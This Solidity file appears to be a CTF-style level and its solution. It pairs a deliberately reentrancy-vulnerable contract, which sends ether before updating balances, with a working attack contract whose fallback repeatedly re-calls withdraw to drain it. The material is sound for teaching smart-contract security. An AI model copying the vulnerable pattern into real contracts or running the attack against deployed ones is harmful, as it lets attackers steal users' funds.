// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./SafeMath.sol";

// 0xA4bB9DA8DbE8913887923d0ad7ea0Ac5e63cA200
contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

// Attack with simple reentrancy
contract ReentranceAttack {
    Reentrance public reentrance;
    address public owner;

    constructor(Reentrance reentrance_) public payable {
        reentrance = reentrance_;
        owner = msg.sender;
        // Add balance to this contract
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() public {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    receive() external payable {
        if (address(reentrance) != address(0)) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        }
    }
}
